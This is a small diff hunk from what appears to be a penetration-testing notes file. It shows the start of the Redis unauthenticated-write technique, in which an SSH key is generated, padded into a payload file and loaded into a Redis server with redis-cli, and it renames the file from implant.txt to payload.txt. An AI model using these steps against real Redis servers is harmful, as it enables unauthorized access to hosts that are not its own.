@@ -41,7 +41,7 @@ TODO: Re-arrange it in initial foothold
 ```
 $ ssh-keygen -qt rsa -b 4096 -f /tmp/id_rsa -C '' -N ''
 
-$ (echo -e "\n\n"; cat /tmp/id_rsa.pub; echo -e "\n\n") > implant.txt
+$ (echo -e "\n\n"; cat /tmp/id_rsa.pub; echo -e "\n\n") > payload.txt
 
 $ redis-cli -h <IP> -x set crackit
 
